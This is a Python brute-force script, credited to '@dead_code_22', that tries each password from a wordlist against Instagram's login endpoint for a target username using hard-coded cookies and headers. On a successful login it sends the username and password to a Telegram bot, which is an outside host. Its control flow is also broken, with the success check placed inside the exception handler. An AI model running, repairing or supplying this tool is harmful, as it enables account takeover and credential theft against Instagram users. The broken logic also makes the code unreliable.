import os,requests,time,random,sys
from requests import *
#==================================================================
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
R2 = '\033[2;31m' #احمر ثاني
G = '\033[2;32m' #اخضر
B = '\033[2;34m'#ازرق
P = '\033[2;35m' #وردي
B2 = '\033[2;36m'#سمائي
B3 = '\033[1;34m' #ازرق فاتح
#==================================================================
#------------------colors---------------#
B="\033[1;30m" # Black
R="\033[1;31m" # Red
G="\033[1;32m" # Green
Y="\033[1;33m" # Yellow
Bl="\033[1;34m" # Blue
P="\033[1;35m" # Purple
C="\033[1;36m" # Cyan
W="\033[1;37m" # White
E = "\033[0;90m" #رمادي
#------------------logo---------------------#
def logo():
    print(f'{G}-{R}-'*29)	
    print(P+"""     _____   _____       ___   _____  
    |  _  \ | ____|     /   | |  _  \ 
    | | | | | |__      / /| | | | | | 
    | | | | |  __|    / / | | | | | | 
    | |_| | | |___   / /  | | | |_| | 
    |_____/ |_____| /_/   |_| |_____/ """)
    print(f'{G}-{R}-'*29)
    print ('  '+Y+'['+P+'*'+Y+']'+C+'Code By :'+W+' @dead_code_22 ™✓ ')
    print ('  '+Y+'['+P+'*'+Y+']'+C+'Channel :'+W+' @deadcode_22 🇪🇬 ')
    print(f'{G}-{R}-'*29)        
logo()
dead = (C+"""━━━━━━━━━━━━━━━━━━━━━━━━━~dead code~━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n""")
#-------------------------start code ---------------------------#
def get_code():
    id=input(W+f" [+]{G} 𝗜𝗗 ➥ {C}")
    token=input(W+f" [+]{G} 𝗧𝗼𝗸𝗲𝗻 ➥ {C}")  
    file = open(input(W+f' [+]{G} Enter List Password :  ➥ {C}'), "r")
    print('\n')
    user = input(f'\033[1;37m [+] {Y}Whats Your User insta : '+G)
    print(dead)
    while True:
        cod = file.readline().split('\n')[0]
        if cod =='':
            break        
        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {"accept": "*/*","accept-encoding": "gzip, deflate, br","accept-language": "en-US,en;q=0.9,ar;q=0.8","content-length": "317","content-type": "application/x-www-form-urlencoded","cookie": "ig_nrcb=1; mid=YfyRDwALAAE2u2Xao59RvgY4Kie1; ig_did=24EAD7A2-41F3-458B-81B2-4C4E87CE77AE; csrftoken=QPYyY1OkYQbU5F6VQOWXdNHJhiP9IwFY","origin": "https://www.instagram.com","referer": "https://www.instagram.com/","sec-ch-ua": '" Not;A Brand";v="99", "Chromium";v="98" , "Microsoft Edge";v="98"',"sec-ch-ua-mobile": "?0","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/98.0.1108.62","x-asbd-id": "198387","x-csrftoken": "QPYyY1OkYQbU5F6VQOWXdNHJhiP9IwFY","x-ig-app-id": "936619743392459","x-ig-www-claim": "hmac.AR1KZ8mFH_XuwnlCjaDXJPbYdAilnj1X4S5VVol7qrRH1Zhc","x-instagram-ajax": "c14f5c1119e5","x-requested-with": "XMLHttpRequest"}
        data = {"username": f"{user}","enc_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{cod}","queryParams": {},"optIntoOneTap": "false","trustedDeviceRecords": {}}  
        try:
            login = post(url, headers=headers, data=data)
        except:
          print(R+' Not found user ')      
          if '"authenticated":true' in login.text:
            print(G+f' DONE LIGIN , USER : {user}')
#--------------------------------------------------------------------#             
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=𝙽𝚎𝚠 𝙰𝚌𝚌𝚘𝚞𝚗𝚝𝚜 𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 ✅\n====================\n[=] User : {user} \n[=] Pass : {cod}\n====================")
            break    
        else:
                print(R+f" </>  Error password : {cod} ")     
                pass                
    sys.exit(B3+' Done Send user or password in bot tele ')            
#------------------------------------------------------------------------#    
get_code()                